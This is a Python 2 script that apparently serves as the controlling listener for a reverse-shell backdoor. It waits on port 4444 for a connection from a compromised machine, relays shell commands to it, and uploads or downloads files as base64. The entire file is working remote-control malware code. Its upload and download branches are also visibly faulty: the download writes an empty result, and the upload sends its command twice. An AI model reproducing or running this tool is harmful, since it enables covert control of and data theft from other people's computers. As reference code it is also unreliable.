#!/usr/bin/env python

import base64
import socket
import json

class Listener:
    #
    def __init__(self,addr,port):
        #
        self.addr = addr
        #
        self.port = port
        #
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        #
        s.bind((addr,int(port)))
        #
        s.listen(3)
        #
        self.connection, address = s.accept()
        #
        print("[*] Connection from: %s " % (str(address)))

    def Receive(self):
        #
        json_data = ""
        #
        while(True):
            #
            try:
                #
                json_data = json_data + self.connection.recv(1024)
                #
                return json.loads(json_data)
                #
            except ValueError:
                #
                continue

    def Transmission(self,data):
        #
        json_data = json.dumps(data)
        #
        self.connection.send(json_data)

    def WriteFile(self,path,content):
        #
        with open(path,'wb') as file:
            #
            file.write(base64.b64decode(content))
            #
            return "[*] Download Successful [*]"

    def ReadFile(self,path):
        #
        with open(path,"rb") as file_object:
            #
            return base64.b64encode(file_object.read())

    def ExecuteCommand(self,cmd):
        #
        if(cmd[0] == "exit"):
            #
            self.Transmission(cmd)
            #
            self.connection.close()
            #
            exit()
            #
        self.Transmission(cmd)
        #
        return self.Receive()

    def run(self):
        #
        while(True):
            #
            cmd = raw_input("[*]>")
            #
            cmd = cmd.split(" ")
            #
            result = ""
            #
            try:
                #
                if(cmd[0] == "upload"):
                    #
                    file_content = self.ReadFile(cmd[1])
                    #
                    cmd.append(file_content)
                    #
                    result = self.ExecuteCommand(cmd)
                    #
                if(cmd[0] == "download"):
                    #
                    result = self.WriteFile(cmd[1],result)
                    #
                else:
                    #
                    result = self.ExecuteCommand(cmd)
                    #
            except Exception:
                    #
                    result = "[!] Error during command execution [!]"
                    #
            print(result)

if(__name__ == '__main__'):
    #
    B = Listener("0.0.0.0",4444)
    #
    B.run()
